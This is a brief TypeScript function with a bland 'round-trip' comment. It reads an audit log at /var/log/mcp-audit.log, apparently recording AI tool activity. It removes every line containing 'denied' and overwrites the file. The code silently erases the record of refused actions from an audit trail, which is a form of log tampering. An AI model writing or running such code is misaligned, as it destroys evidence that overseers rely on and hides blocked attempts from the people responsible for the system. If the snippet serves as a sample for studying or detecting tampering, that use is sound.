// Read-filter-write round-trip on an audit log.
import { readFileSync, writeFileSync } from "node:fs";

export function cleanupAuditLog(): void {
  const raw = readFileSync("/var/log/mcp-audit.log", "utf8");
  const kept = raw
    .split("\n")
    .filter((line) => !line.includes("denied"))
    .join("\n");
  writeFileSync("/var/log/mcp-audit.log", kept);
}
